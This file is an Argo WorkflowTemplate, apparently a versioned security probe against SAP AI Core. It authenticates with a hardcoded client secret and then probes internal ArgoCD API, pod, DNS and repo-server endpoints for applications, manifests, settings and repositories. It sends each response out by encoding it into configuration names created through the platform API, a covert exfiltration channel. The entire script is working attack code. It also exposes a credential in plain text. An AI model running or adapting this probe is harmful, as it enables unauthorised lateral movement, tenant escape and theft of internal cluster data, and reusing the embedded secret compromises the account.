apiVersion: argoproj.io/v1alpha1
kind: WorkflowTemplate
metadata:
  name: bb14-probe
  annotations:
    scenarios.ai.sap.com/description: "BB14 test workflow"
    scenarios.ai.sap.com/name: "bb14-scenario"
    executables.ai.sap.com/description: "BB14 test executable"
    executables.ai.sap.com/name: "bb14-probe"
  labels:
    scenarios.ai.sap.com/id: "bb14-scenario"
    executables.ai.sap.com/id: "bb14-probe"
    ai.sap.com/version: "52.0.0"
spec:
  entrypoint: main
  templates:
  - name: main
    metadata:
      labels:
        ai.sap.com/resourcePlan: starter
    container:
      image: nicolaka/netshoot:latest
      command:
      - bash
      - -c
      - |
        # V52: Try ArgoCD native API from pod for manifest content
        AUTH_URL="https://cf-aicore-security-bb-14.authentication.eu10.hana.ondemand.com"
        API="https://api.ai.sec-eu10.eu-central-1.aws.ml.hana.ondemand.com"
        CID="sb-aicore-bb-14!b627554|aicore-xsuaa-std!b563784"
        CSC='aicore-bb-14-key$HWyz9kltTGQqtpP0ZbBl-NPwng_aMxh8F2GaXyYiPRc='

        JWT=$(curl -sk -X POST "${AUTH_URL}/oauth/token" \
          -d "grant_type=client_credentials&client_id=${CID}&client_secret=${CSC}" 2>/dev/null \
          | python3 -c "import json,sys; print(json.load(sys.stdin).get('access_token','FAIL'))" 2>/dev/null)

        save() {
          local name="v52-$(echo "$1" | tr -c 'a-zA-Z0-9._-' '-' | head -c 220)"
          curl -sk -X POST "${API}/v2/lm/configurations" \
            -H "Authorization: Bearer $JWT" -H "AI-Resource-Group: default" \
            -H "Content-Type: application/json" \
            -d "{\"name\":\"${name}\",\"executableId\":\"bb14-probe\",\"scenarioId\":\"bb14-scenario\"}" 2>/dev/null > /dev/null
        }

        # ArgoCD service IP (from V34) and pod IP (from SSRF error)
        ARGOCD_SVC="100.107.174.75"
        ARGOCD_POD="100.64.80.38"
        ARGOCD_DNS="argocd-server.argocd.svc.cluster.local"

        # 1. Try ArgoCD API via service IP (port 80/443)
        echo "=== ARGOCD API VIA SVC IP ===" >&2
        for port in 80 443 8080; do
          R=$(curl -sk --connect-timeout 3 "http://${ARGOCD_SVC}:${port}/api/v1/applications" 2>&1 | head -c 200)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out"; then
            save "svc-${port}-apps-$(echo $R | head -c 150)"
          fi
          R=$(curl -sk --connect-timeout 3 "https://${ARGOCD_SVC}:${port}/api/v1/applications" 2>&1 | head -c 200)
          if [ -n "$R" ] && ! echo "$R" | grep -q "refused\|timed out"; then
            save "svc-https-${port}-apps-$(echo $R | head -c 150)"
          fi
        done

        # 2. Try ArgoCD API via pod IP
        echo "=== ARGOCD API VIA POD IP ===" >&2
        for port in 8080 8083 443; do
          R=$(curl -sk --connect-timeout 3 "https://${ARGOCD_POD}:${port}/api/v1/applications" 2>&1 | head -c 200)
          save "pod-${port}-$(echo $R | head -c 150)"
        done

        # 3. Try ArgoCD API via DNS
        echo "=== ARGOCD API VIA DNS ===" >&2
        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
        save "dns-apps-$(echo $R | head -c 150)"
        R=$(curl -sk --connect-timeout 5 "https://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
        save "dns-https-apps-$(echo $R | head -c 150)"

        # 4. Try without auth - some ArgoCD allow anonymous read
        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/settings" 2>&1 | head -c 200)
        save "dns-settings-$(echo $R | head -c 150)"

        # 5. Try repo-server gRPC-web (some expose HTTP transcoding)
        REPO_SRV="argocd-repo-server.argocd.svc.cluster.local"
        R=$(curl -sk --connect-timeout 3 "http://${REPO_SRV}:8081/" 2>&1 | head -c 150)
        save "reposrv-8081-$(echo $R | head -c 100)"
        R=$(curl -sk --connect-timeout 3 "http://${REPO_SRV}:8084/" 2>&1 | head -c 150)
        save "reposrv-8084-$(echo $R | head -c 100)"

        # 6. Try ArgoCD API with our XSUAA token (might be accepted)
        R=$(curl -sk --connect-timeout 5 -H "Authorization: Bearer $JWT" "http://${ARGOCD_DNS}/api/v1/applications" 2>&1 | head -c 200)
        save "dns-jwt-apps-$(echo $R | head -c 150)"

        # 7. Try the manifests endpoint specifically
        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/applications/ghe-gitops-app/manifests" 2>&1 | head -c 200)
        save "dns-manifests-$(echo $R | head -c 150)"

        # 8. Try listing repos from ArgoCD API
        R=$(curl -sk --connect-timeout 5 "http://${ARGOCD_DNS}/api/v1/repositories" 2>&1 | head -c 200)
        save "dns-repos-$(echo $R | head -c 150)"

        echo "V52 DONE" >&2
